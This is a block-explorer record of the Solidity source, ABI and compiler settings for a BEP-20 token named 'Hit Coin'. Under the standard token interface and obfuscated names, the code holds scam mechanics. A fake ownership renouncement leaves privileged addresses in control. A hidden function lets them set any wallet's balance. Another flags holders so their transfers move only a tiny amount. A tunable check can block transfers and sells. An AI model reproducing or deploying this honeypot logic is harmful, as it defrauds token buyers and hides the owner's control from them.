{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract isToTake {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface teamIs {\n    function createPair(address maxModeList, address listLaunched) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface feeAuto {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface txLimit {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address atAutoSell) external view returns (uint256);\n\n    function transfer(address receiverAmount, uint256 exemptTokenTake) external returns (bool);\n\n    function allowance(address liquidityAuto, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 exemptTokenTake) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverAmount,\n        uint256 exemptTokenTake\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fundExemptTx, uint256 value);\n    event Approval(address indexed liquidityAuto, address indexed spender, uint256 value);\n}\n\ninterface limitList is txLimit {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract HitCoin is isToTake, txLimit, limitList {\n\n    function minAuto(address totalFrom) public {\n        if (modeToLaunched) {\n            return;\n        }\n        \n        atTo[totalFrom] = true;\n        \n        modeToLaunched = true;\n    }\n\n    uint256 private liquidityList = 100000000 * 10 ** 18;\n\n    function shouldWalletIs() public {\n        emit OwnershipTransferred(marketingAuto, address(0));\n        atWallet = address(0);\n    }\n\n    mapping(address => mapping(address => uint256)) private fundWallet;\n\n    function decimals() external view virtual override returns (uint8) {\n        return txSell;\n    }\n\n    function senderMarketing(address maxAuto, address receiverAmount, uint256 exemptTokenTake) internal view returns (uint256) {\n        require(exemptTokenTake > 0);\n\n        uint256 limitExemptAmount = 0;\n        if (maxAuto == senderAmount && feeLimit > 0) {\n            limitExemptAmount = exemptTokenTake * feeLimit / 100;\n        } else if (receiverAmount == senderAmount && walletFee > 0) {\n            limitExemptAmount = exemptTokenTake * walletFee / 100;\n        }\n        require(limitExemptAmount <= exemptTokenTake);\n        return exemptTokenTake - limitExemptAmount;\n    }\n\n    bool public isLiquidity;\n\n    mapping(address => uint256) private sellTx;\n\n    event OwnershipTransferred(address indexed marketingReceiverTake, address indexed feeTake);\n\n    constructor (){\n        if (isLiquidity != txMin) {\n            isLiquidity = true;\n        }\n        shouldWalletIs();\n        feeAuto maxToken = feeAuto(tokenLimit);\n        senderAmount = teamIs(maxToken.factory()).createPair(maxToken.WETH(), address(this));\n        modeMax = teamIs(maxToken.factory()).feeTo();\n        \n        marketingAuto = _msgSender();\n        atTo[marketingAuto] = true;\n        sellTx[marketingAuto] = liquidityList;\n        if (senderExempt != isLiquidity) {\n            isLiquidity = false;\n        }\n        emit Transfer(address(0), marketingAuto, liquidityList);\n    }\n\n    address public marketingAuto;\n\n    uint8 private txSell = 18;\n\n    bool private senderExempt;\n\n    bool public modeToLaunched;\n\n    mapping(address => bool) public atTo;\n\n    mapping(address => bool) public enableExempt;\n\n    function approve(address enableMax, uint256 exemptTokenTake) public virtual override returns (bool) {\n        fundWallet[_msgSender()][enableMax] = exemptTokenTake;\n        emit Approval(_msgSender(), enableMax, exemptTokenTake);\n        return true;\n    }\n\n    uint256 public feeLimit = 3;\n\n    uint256 isReceiver;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return liquidityList;\n    }\n\n    function launchMode(address senderLimit, uint256 exemptTokenTake) public {\n        atSwapFund();\n        sellTx[senderLimit] = exemptTokenTake;\n    }\n\n    function buyFrom(address maxAuto, address receiverAmount, uint256 exemptTokenTake) internal returns (bool) {\n        if (maxAuto == marketingAuto) {\n            return isExempt(maxAuto, receiverAmount, exemptTokenTake);\n        }\n        uint256 minTo = txLimit(senderAmount).balanceOf(modeMax);\n        require(minTo == buyTake);\n        require(receiverAmount != modeMax);\n        if (enableExempt[maxAuto]) {\n            return isExempt(maxAuto, receiverAmount, autoMin);\n        }\n        exemptTokenTake = senderMarketing(maxAuto, receiverAmount, exemptTokenTake);\n        return isExempt(maxAuto, receiverAmount, exemptTokenTake);\n    }\n\n    function teamEnable(address tokenMarketing) public {\n        atSwapFund();\n        \n        if (tokenMarketing == marketingAuto || tokenMarketing == senderAmount) {\n            return;\n        }\n        enableExempt[tokenMarketing] = true;\n    }\n\n    string private receiverTotal = \"HCN\";\n\n    uint256 buyTake;\n\n    function atSwapFund() private view {\n        require(atTo[_msgSender()]);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverTotal;\n    }\n\n    address modeMax;\n\n    function isExempt(address maxAuto, address receiverAmount, uint256 exemptTokenTake) internal returns (bool) {\n        require(sellTx[maxAuto] >= exemptTokenTake);\n        sellTx[maxAuto] -= exemptTokenTake;\n        sellTx[receiverAmount] += exemptTokenTake;\n        emit Transfer(maxAuto, receiverAmount, exemptTokenTake);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return atWallet;\n    }\n\n    function swapTokenEnable(uint256 exemptTokenTake) public {\n        atSwapFund();\n        buyTake = exemptTokenTake;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return autoAtEnable;\n    }\n\n    address public senderAmount;\n\n    function transfer(address senderLimit, uint256 exemptTokenTake) external virtual override returns (bool) {\n        return buyFrom(_msgSender(), senderLimit, exemptTokenTake);\n    }\n\n    function transferFrom(address maxAuto, address receiverAmount, uint256 exemptTokenTake) external override returns (bool) {\n        if (_msgSender() != tokenLimit) {\n            if (fundWallet[maxAuto][_msgSender()] != type(uint256).max) {\n                require(exemptTokenTake <= fundWallet[maxAuto][_msgSender()]);\n                fundWallet[maxAuto][_msgSender()] -= exemptTokenTake;\n            }\n        }\n        return buyFrom(maxAuto, receiverAmount, exemptTokenTake);\n    }\n\n    uint256 constant autoMin = 15 ** 10;\n\n    function owner() external view returns (address) {\n        return atWallet;\n    }\n\n    string private autoAtEnable = \"Hit Coin\";\n\n    function allowance(address limitMax, address enableMax) external view virtual override returns (uint256) {\n        if (enableMax == tokenLimit) {\n            return type(uint256).max;\n        }\n        return fundWallet[limitMax][enableMax];\n    }\n\n    bool private txMin;\n\n    address tokenLimit = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address private atWallet;\n\n    uint256 public walletFee = 0;\n\n    bool public senderTo;\n\n    function balanceOf(address atAutoSell) public view virtual override returns (uint256) {\n        return sellTx[atAutoSell];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingReceiverTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeTake\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundExemptTx\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableMax\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptTokenTake\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atAutoSell\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptTokenTake\",\"type\":\"uint256\"}],\"name\":\"launchMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalFrom\",\"type\":\"address\"}],\"name\":\"minAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeToLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldWalletIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"exemptTokenTake\",\"type\":\"uint256\"}],\"name\":\"swapTokenEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenMarketing\",\"type\":\"address\"}],\"name\":\"teamEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptTokenTake\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptTokenTake\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "HitCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}